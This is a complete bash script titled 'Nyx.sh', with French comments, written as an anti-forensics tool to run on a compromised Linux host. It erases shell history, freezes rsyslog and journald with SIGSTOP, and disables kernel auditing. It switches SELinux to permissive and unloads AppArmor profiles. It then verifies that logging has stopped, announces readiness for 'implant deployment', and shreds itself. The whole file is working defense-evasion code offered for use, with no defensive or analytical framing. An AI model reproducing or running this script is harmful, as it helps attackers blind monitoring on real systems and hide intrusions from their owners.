#!/bin/bash
# Nyx.sh (v5)
# Target: Debian / Kali / Fedora / CentOS

# [CONFIG]
# Mettre à 0 pour la prod (vrai silence), 1 pour le debug
VERBOSE=1

# Couleurs (seulement si verbose)
if [ "$VERBOSE" -eq 1 ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; NC=''
fi

log() {
    if [ "$VERBOSE" -eq 1 ]; then echo -e "$1"; fi
}

# ==============================================================================
# PHASE 0: GHOST IN THE SHELL
# ==============================================================================
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
shopt -u -o history 2>/dev/null

log "${YELLOW}[SILENCER V4] Target Acquired. Initializing Protocols...${NC}"

# ==============================================================================
# PHASE 1: FREEZE LOGGING DAEMONS (Rsyslog & Journald)
# Priorité absolue : Arrêter l'écriture disque avant de toucher à la sécu.
# ==============================================================================
log "\n${YELLOW}[+] Phase 1: Freezing Loggers (Rsyslog & Journald)...${NC}"

# Liste élargie des démons de logs
TARGETS=("rsyslogd" "syslog-ng" "systemd-journald")

for daemon in "${TARGETS[@]}"; do
    # pgrep -f est plus large (trouve le process même avec des arguments)
    PIDS=$(pgrep -f "$daemon")
    
    if [ ! -z "$PIDS" ]; then
        for pid in $PIDS; do
            kill -STOP "$pid" 2>/dev/null
            log "   [>] $daemon (PID $pid) -> SIGSTOP sent."
        done
    fi
done

# Petite pause pour laisser le kernel traiter les signaux
sleep 0.5

# ==============================================================================
# PHASE 2: BLIND KERNEL AUDIT
# ==============================================================================
log "\n${YELLOW}[+] Phase 2: Disabling Kernel Audit...${NC}"

if command -v auditctl >/dev/null; then
    auditctl -e 0 >/dev/null 2>&1
    auditctl -D >/dev/null 2>&1
    log "   ${GREEN}[SUCCESS] auditctl commands executed.${NC}"
else
    # Fallback: Si auditctl n'est pas là, c'est souvent bon signe (pas installé),
    # mais on vérifie si le module kernel est chargé.
    if grep -q "audit" /proc/modules; then
         log "   ${RED}[WARNING] Audit kernel module loaded but 'auditctl' missing!${NC}"
    else
         log "   [OK] Audit kernel module not present."
    fi
fi

# ==============================================================================
# PHASE 3: NEUTRALIZE DEFENSES (AppArmor AND SELinux)
# ==============================================================================
log "\n${YELLOW}[+] Phase 3: Dropping Shields (AppArmor/SELinux)...${NC}"

# --- 3A. SELinux (Fedora/CentOS) ---
if command -v setenforce >/dev/null; then
    # On vérifie si SELinux est actif
    SE_STATUS=$(getenforce 2>/dev/null)
    if [ "$SE_STATUS" != "Disabled" ] && [ "$SE_STATUS" != "Permissive" ]; then
        log "   [!] SELinux Enforcing detected. Switching to Permissive..."
        setenforce 0 2>/dev/null
        log "   ${GREEN}[SUCCESS] SELinux is now Permissive (Logs are frozen, so no alerts).${NC}"
    else
        log "   [OK] SELinux already Disabled or Permissive."
    fi
fi

# --- 3B. AppArmor (Debian/Kali/Ubuntu) ---
if command -v apparmor_parser >/dev/null; then
    log "   [>] Unloading AppArmor profiles..."
    # Méthode plus robuste : trouver les fichiers de profil et les décharger 1 par 1
    # On redirige stderr pour éviter le spam "Failed to get profiles"
    find /etc/apparmor.d/ -maxdepth 1 -type f -exec apparmor_parser -R {} \; >/dev/null 2>&1
    log "   ${GREEN}[SUCCESS] AppArmor unload sequence complete.${NC}"
elif [ -d "/sys/kernel/security/apparmor" ]; then
    log "   ${RED}[WARNING] AppArmor active but parser tools missing!${NC}"
    # Ici, un APT tenterait d'écrire directement dans /sys/kernel/security/apparmor/.remove
    # C'est complexe, on laisse pour l'instant.
fi

# ==============================================================================
# PHASE 4: VERIFICATION & CLEANUP
# ==============================================================================
log "\n${YELLOW}[+] Phase 4: Final Check...${NC}"

# Petit test rapide silencieux
logger "PA8_CHECK_V4" 2>/dev/null

if journalctl -n 5 2>/dev/null | grep -q "PA8_CHECK_V4"; then
    log "   ${RED}[CRITICAL FAILURE] Logs are still being written! Abort mission.${NC}"
    exit 1
else
    log "   ${GREEN}[SYSTEM SECURE] Ghost Mode Active. Ready for implant deployment.${NC}"
fi

# Suppression du script lui-même (Anti-Forensic Avancé)
# -z : ajoute des zéros à la fin pour cacher le déchiquetage
# -u : supprime le fichier après écriture
if command -v shred >/dev/null; then
    shred -zu "$0" 2>/dev/null
else
    rm -- "$0"
fi
